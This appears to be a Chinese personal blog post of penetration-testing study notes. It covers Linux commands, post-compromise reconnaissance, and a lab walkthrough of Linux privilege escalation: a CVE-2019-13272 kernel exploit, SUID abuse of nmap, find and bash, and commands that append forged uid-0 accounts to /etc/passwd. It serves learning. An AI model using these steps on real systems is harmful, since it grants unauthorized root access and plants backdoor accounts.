@@ -1,0 +1,1654 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="知识点梳理 &amp; 复现 要求：写清楚各个知识点，环境搭建，漏洞复现，使用的工具等  系统相关Linux常用命令文件管理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849ls 列举当前目录内容	ls -al 查看当前目录下所有文件（包括隐藏文件），并且显示文件详细信息">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透知识点">
+<meta property="og:url" content="http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="知识点梳理 &amp; 复现 要求：写清楚各个知识点，环境搭建，漏洞复现，使用的工具等  系统相关Linux常用命令文件管理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849ls 列举当前目录内容	ls -al 查看当前目录下所有文件（包括隐藏文件），并且显示文件详细信息">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720103606519.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720103951085.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720104648771.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720104735795.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720170143300.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720170302762.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720140111241.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720140532708.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720142200911.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720142318447.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720152342842.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720152752202.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720152821108.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720173740391.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210818142203251.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210818142004907.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210818142230467.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210721095440738.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210721102908854.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210721104615754.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210721112724742.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210721164602551.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210722100209527.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210722110852458.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804094211071.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804095544847.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804103007109.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210730095849745.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210730113202468.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210730113725281.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210730125530065.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210806163424137.png">
+<meta property="article:published_time" content="2021-10-13T10:55:50.000Z">
+<meta property="article:modified_time" content="2021-10-13T10:56:35.735Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210720103606519.png">
+  
+  <title>内网渗透知识点 - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网渗透知识点">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-13 18:55" pubdate>
+        2021年10月13日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      41k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      127 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网渗透知识点</h1>
+            
+            <div class="markdown-body">
+              <h1 id="知识点梳理-amp-复现"><a href="#知识点梳理-amp-复现" class="headerlink" title="知识点梳理 &amp; 复现"></a>知识点梳理 &amp; 复现</h1><blockquote>
+<p>要求：写清楚各个知识点，环境搭建，漏洞复现，使用的工具等</p>
+</blockquote>
+<h2 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ls</span> <span class="hljs-string">列举当前目录内容</span><br>	<span class="hljs-attr">ls</span> <span class="hljs-string">-al 查看当前目录下所有文件（包括隐藏文件），并且显示文件详细信息（修改时间，权限等）</span><br><br><span class="hljs-attr">find</span> <span class="hljs-string">查找文件（根据文件的属性进行查找）</span><br>	<span class="hljs-attr">find</span> <span class="hljs-string">/ -name demon.txt 在根目录下查找该文件</span><br><span class="hljs-attr">grep</span> <span class="hljs-string">查找文件（根据文件的内容进行查找），可以搭配正则表达式使用</span><br><span class="hljs-attr">which</span> <span class="hljs-string">在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个结果</span><br><br><span class="hljs-attr">cat</span> <span class="hljs-string">输出文件内容</span><br>	<span class="hljs-attr">cat</span> <span class="hljs-string">-n 显示内容的同时打印出行号</span><br><span class="hljs-attr">tac</span> <span class="hljs-string">与cat相反，从最后一行打印文件内容</span><br><span class="hljs-attr">nl</span> <span class="hljs-string">显示文件内容并且打印行号</span><br><span class="hljs-attr">head</span> <span class="hljs-string">查看文件前几行</span><br>	<span class="hljs-attr">head</span> <span class="hljs-string">-n number filename.txt 显示文件的先number行</span><br><span class="hljs-attr">tail</span> <span class="hljs-string">显示文件结尾几行（与head相反，用法相似）</span><br><span class="hljs-attr">more</span> <span class="hljs-string">对于比较长的文件内容会分页显示</span><br><span class="hljs-attr">less</span> <span class="hljs-string">自由上下翻页查看文件内容</span><br><br><span class="hljs-attr">touch</span> <span class="hljs-string">创建文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">删除文件</span><br>	<span class="hljs-attr">rm</span> <span class="hljs-string">-f 强制删除文件</span><br>	<span class="hljs-attr">rm</span> <span class="hljs-string">-r 递归删除目录</span><br><span class="hljs-attr">mkdir</span> <span class="hljs-string">创建目录</span><br><span class="hljs-attr">rmdir</span> <span class="hljs-string">删除目录</span><br><br><span class="hljs-attr">cp</span> <span class="hljs-string">filename path/filename 复制文件</span><br><span class="hljs-attr">mv</span> <span class="hljs-string">filename path/filename 移动文件</span><br><br><span class="hljs-attr">pwd</span> <span class="hljs-string">显示当前位置</span><br><span class="hljs-attr">cd</span> <span class="hljs-string">切换文件路劲</span><br><br><span class="hljs-meta">vim/vi</span>  <span class="hljs-string">文件编辑</span><br><br><span class="hljs-meta">文件权限：r</span> <span class="hljs-string">可读 4   w 可写 2   x 可执行  1</span><br><span class="hljs-attr">rwx</span> = <span class="hljs-string">4+2+1 =7</span><br><span class="hljs-meta">drwxr-xr-x</span> <span class="hljs-string">1 kali kali  4096 Jul 19 15:36 1</span><br><span class="hljs-meta">-rw-r--r--</span> <span class="hljs-string">1 kali kali     0 Jul 19 15:36 2</span><br><span class="hljs-meta">第一位：d代表文件夹</span> <span class="hljs-string">-代表文件</span><br><span class="hljs-attr">第一段：代表拥有者的权限</span><br><span class="hljs-attr">第二段：拥有者所在组的组员权限</span><br><span class="hljs-attr">第三段：其他用户的权限</span><br><span class="hljs-meta">*</span> <span class="hljs-string">三位为一段</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">更改文件权限</span><br>	<span class="hljs-attr">chmod</span> <span class="hljs-string">777 file 设置文件所有人都可以读写</span><br><span class="hljs-attr">chown</span> <span class="hljs-string">修改文件拥有者权限（一般只有root用户有这个操作权限）</span><br><br><span class="hljs-attr">tar</span> <span class="hljs-string">打包并压缩文件</span><br>	<span class="hljs-attr">tar</span> <span class="hljs-string">-zcvf filename.tar demon.txt 压缩文件</span><br>    <span class="hljs-attr">tar</span> <span class="hljs-string">-zxvf filename.tar 解压文件</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ps</span> <span class="hljs-string">显示系统运行进程</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">显示进程树</span><br>	<span class="hljs-attr">pstree</span> <span class="hljs-string">-aup 显示当前系统的进程树</span><br><span class="hljs-attr">top</span> <span class="hljs-string">默认按照cup的占用情况，显示进程</span><br><span class="hljs-attr">kill</span> <span class="hljs-string">终止进程 kill -l PID</span><br><span class="hljs-attr">killall</span> <span class="hljs-string">杀死同一进程组内的所有进程 killall taskname</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">重定向符 &gt;<br>管道符  <span class="hljs-string">|</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>目前只记得这些，后期再继续更新</p>
+</blockquote>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">重要：<br>ipconfig 查看IP地址<br>netstat -ano 查看端口信息<br>whoami 当前用户（查询当前用户权限）<br>id 当前用户的权限和所在的管理组<br>uname -a 查看内核版本（方便后期利用内核漏洞提权）<br>ps/top 当前进程<br>cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup 判断是否是docker容器<br>	原理：容器是通过cgroup来实现资源限制，判断容器是否在一个cgroup组中<br>	显示结果很长的就基本可以判断为docker<br><br>主要：<br><span class="hljs-regexp">/etc/</span>network/interfaces 查看网卡配置<br>cat <span class="hljs-regexp">/proc/</span>version 查看内核信息<br>cat <span class="hljs-regexp">/etc/</span>*release 查看linux发行信息<br>hostname 打印主机名<br>iptables -L 查看防火墙配置（需要root）<br>cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf apache配置文件<br>cat <span class="hljs-regexp">/etc/my</span>.conf  mysql配置文件<br>cat <span class="hljs-regexp">/etc/</span>shadow 查看账户密码信息（root权限）<br>cat <span class="hljs-regexp">/etc/</span>passwd 查看用户信息<br>cat <span class="hljs-regexp">/etc/g</span>roup 查看用户组信息<br>查看.bash_history文件 查看指令历史记录<br>查看.mysql_history文件 查看mysql操作记录<br>查看系统日志：<span class="hljs-regexp">/var/</span>log<br>查看登录日志：w  who lastlog<br><br>次要：<br>dpkg -l 查看安装的软件包<br>crontab -l 查看是否有计划任务<br>cat <span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>  开机启动项<br>cat <span class="hljs-regexp">/etc/</span>shells  查看可以用shell<br>env  打印系统环境信息<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo  查看cpu信息<br>* /proc 目录很重要，需要注意<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>感觉Linux的内网渗透比较少见，收集的信息也相比于windows要少一些</p>
+</blockquote>
+<h4 id="提权手法"><a href="#提权手法" class="headerlink" title="提权手法"></a>提权手法</h4><h5 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h5><blockquote>
+<p>提权原理偏向于Linux内核，没接触过这个方向，看来一下网上文章，不太能看懂。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/R4v3n/articles/9227723.html">https://www.cnblogs.com/R4v3n/articles/9227723.html</a></p>
+</blockquote>
+<p>先收集内核版本信息，然后直接利用工具提权（当个脚本小子挺好的），这几个工具利用起来感觉效果不好。</p>
+<ol>
+<li><code>searchsploit</code></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester%EF%BC%88%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E6%A3%80%E6%B5%8B%E4%B8%80%E4%BA%9BLinux%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%89">https://github.com/mzet-/linux-exploit-suggester（这个工具可以大致检测一些Linux可能存在的漏洞）</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%9A%84perl%E8%AF%AD%E8%A8%80%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AF%8F%E4%B8%AA%E4%B8%BB%E6%9C%BA%E9%83%BD%E8%83%BD%E6%89%A7%E8%A1%8C%EF%BC%89">https://github.com/jondonas/linux-exploit-suggester-2（使用的perl语言，不一定每个主机都能执行）</a></li>
+</ol>
+<blockquote>
+<p>内核提权一般是作为最后选项，因为exp执行后远程主机可能会崩溃，许多公开可用的提权漏洞并不是很稳定，目标主机也可能在你得到root权限后直接崩溃，并且漏洞利用可能会留下导致被捕获的痕迹/日志。</p>
+</blockquote>
+<h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>漏洞环境：ubuntu16.04    Linux Kernel 4.15</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103606519.png" srcset="/img/loading.gif" lazyload alt="image-20210720103606519"></p>
+<p>首先使用工具检测一下可能存在的提权漏洞</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103951085.png" srcset="/img/loading.gif" lazyload alt="image-20210720103951085"></p>
+<p><strong>CVE-2019-13272</strong>（该漏洞利用前提:需要目标服务器有桌面环境）</p>
+<p><a target="_blank" rel="noopener" href="https://0x20h.com/p/fe4f#pkexec">https://0x20h.com/p/fe4f#pkexec</a></p>
+<p>漏洞影响版本：Linux Kernel &lt; 5.1.17</p>
+<p>…………上面工具没有检测出这个漏洞，这里尝试直接利用这个漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bcoles/kernel-exploits">https://github.com/bcoles/kernel-exploits</a> 下载EXP</p>
+<p>编译c文件，并且需要赋予可执行权限</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104648771.png" srcset="/img/loading.gif" lazyload alt="image-20210720104648771"></p>
+<p>直接执行，获取到root权限</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104735795.png" srcset="/img/loading.gif" lazyload alt="image-20210720104735795"></p>
+<blockquote>
+<p>这个复现过程很简单，但是原理很难，这个CVE由于需要目标主机是桌面版所以平时的用处不大。</p>
+</blockquote>
+<p><strong>CVE-2021-33909</strong></p>
+<p>影响范围：Linux kernel 3.16 - 5.13.x</p>
+<blockquote>
+<p>暂无EXP，提权范围挺广的</p>
+</blockquote>
+<h5 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a>利用SUID提权</h5><p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://jlkl.github.io/2020/01/27/Web_15/">https://jlkl.github.io/2020/01/27/Web_15/</a></p>
+<p>SUID是一种特殊的权限，可以让调用者在执行的过程中暂时获得该文件的拥有者的权限。如果找到root用户拥有的SUID文件并运行，就可以暂时获取到root用户的权限</p>
+<p>查找具有SUID权限位并且属与root的文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br>………<br></code></pre></td></tr></table></figure>
+
+<p>常见可以用来提权的命令</p>
+<ol>
+<li><code>nmap</code></li>
+<li><code>find</code></li>
+<li><code>vim</code></li>
+<li><code>bash</code></li>
+<li><code>nano</code></li>
+<li><code>cp/mv</code></li>
+<li><code>more/less</code></li>
+<li><code>awk</code></li>
+<li><code>apt</code></li>
+<li>…………</li>
+</ol>
+<p><strong>namp提权</strong></p>
+<p> 在<code>nmap 5.20</code>以前存在<code>interactive</code>交互模式，可以利用这个交互模式提权</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">nmap</span> <span class="hljs-string">--interactive</span><br><span class="hljs-comment">!sh</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+<p>P神里面对新的<code>nmap</code>提权做了深入的解释，简单写一下我的理解</p>
+<p>SUID提权主要还是灵活利用了对于普通用户当前运行命令时的<code>Effective UID</code>，只有这个程序的所有者是0号或其他super user，同时拥有<code>suid</code>权限，才可以提权。<code>nmap</code>具有了<code>suid</code>时和其他命令具有<code>suid</code>是有区别的。</p>
+<p>新版的<code>nmap</code>没有了<code>interactive</code>交互模式，并且随着Linux新版本的更新研究人员也对<code>suid</code>提权做了限制。这里采用了新的方法来使用<code>nmap</code>提权，添加用户</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">local file = io.open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:write(<span class="hljs-string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)<br>file:close()<br></code></pre></td></tr></table></figure>
+
+<p>为<code>nmap</code>赋予<code>root</code>用户的<code>suid</code>权限</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170143300.png" srcset="/img/loading.gif" lazyload alt="image-20210720170143300"></p>
+<p>执行上面的脚本，成功添加了一个root用户，直接切换用户获取到权限</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170302762.png" srcset="/img/loading.gif" lazyload alt="image-20210720170302762"></p>
+<p><strong>find提权</strong></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140111241.png" srcset="/img/loading.gif" lazyload alt="image-20210720140111241"></p>
+<p>查询到<code>find</code> 具有<code>suid</code>权限，进行<code>find</code>提权</p>
+<p>先创建一个文件，中途借用这个文件来执行命令</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140532708.png" srcset="/img/loading.gif" lazyload alt="image-20210720140532708"></p>
+<p>成功提升了权限</p>
+<p><strong>bash</strong></p>
+<p><code>bash -p</code> 开启一个新的shell，如果是suid的话就是获取到root的shell</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142200911.png" srcset="/img/loading.gif" lazyload alt="image-20210720142200911"></p>
+<p>执行命令获取权限</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142318447.png" srcset="/img/loading.gif" lazyload alt="image-20210720142318447"></p>
+<p><strong>cp / mv</strong></p>
+<p>覆盖<code>/etc/shadow</code> 或者 <code>/etc/passwd</code></p>
+<blockquote>
+<p>需要小心一点，命令不要弄错了不然容易改崩用户</p>
+</blockquote>
+<p>查看具有SUID权限的命令</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152342842.png" srcset="/img/loading.gif" lazyload alt="image-20210720152342842"></p>
+<p>伪造用户</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /etc/passwd &gt; passwd  将文件复制出来<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123  伪造密码<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd 密码写入复制文件<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cp passwd /etc/passwd  修改正常的passwd文件<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su - hack 填入密码即可<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152752202.png" srcset="/img/loading.gif" lazyload alt="image-20210720152752202"></p>
